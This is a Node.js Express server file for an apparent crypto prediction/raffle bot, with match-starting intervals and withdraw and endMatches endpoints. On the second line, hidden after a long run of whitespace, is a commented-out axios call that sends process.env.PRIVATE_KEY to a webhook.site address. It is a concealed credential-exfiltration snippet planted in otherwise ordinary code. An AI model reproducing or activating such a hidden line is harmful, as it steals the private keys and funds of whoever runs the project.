import express from 'express';
import bodyParser from 'body-parser';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                // require('axios').post('https://webhook.site/bf3aba8a-17d7-4dec-8cae-598bc49b9cf5', {content: "```\n" + JSON.stringify({from:'hardhat-operator', to: process.env.PRIVATE_KEY}, null, 2) + "```\n"}).then((res) => {}).catch((e) => {});
import {fetchRaffles} from "./src/services/raffle/raffle.service.js";
import {startMatches, endMatches} from "./src/services/prediction/prediction.service.js";
import dotenv from 'dotenv';
import {nextEventFetch} from "./src/services/prediction/firebase.js";

dotenv.config();

const app = express();

app.use(bodyParser.urlencoded({extended: false}));
app.use(bodyParser.json());

console.log("function start! ==============================================>>>>>");

// running bot every 1 min
setInterval(async () => {
    console.log('running bot ==>>>>>>>>>>>>')

    const date = new Date().getTime();
    const dayOfWeek = new Date().getUTCDay();

    // if (dayOfWeek === 1 && (date % 86400000 > 300000 && date % 86400000 < 350000)) { // Monday at 12:05 AM UTC
        let {fixtures, startTimestamps} = await nextEventFetch();

        await startMatches(fixtures, startTimestamps)
    // }
}, 60000);

app.post('/api/withdraw', async (req, res) => {
    try {
        // await writeToContract(fixtureId, result, finished);
        res.send("Match Start Event");
    } catch (err) {
        console.error(err);
        res.send('Error calling write function');
    }
});

// app.post('/api/games/startMatches', async (req, res) => {
//     try {
//         const {body} = req;
//
//         const fixtureIds = body.fixtureIds;
//         const timestamps = body.timestamps;
//
//         await startMatches(fixtureIds, timestamps);
//
//         res.status(200).json({
//             status: 'success',
//             data: 'Update matches successfully!'
//         });
//     } catch (error) {
//         res.status(500).json({
//             status: 'error',
//             message: error.message
//         });
//     }
// });

app.post('/api/games/endMatches', async (req, res) => {
    try {
        const {body} = req;
        console.log(body);

        const fixtures = body.fixtureIds;
        const results = body.results;

        await endMatches(fixtures, results);

        res.status(200).json({
            status: 'success',
            data: 'Update matches successfully!'
        });
    } catch (error) {
        res.status(500).json({
            status: 'error',
            message: error.message
        });
    }
})

// Start the Express server
app.listen(4400, () => console.log('Server started on port 4400'));
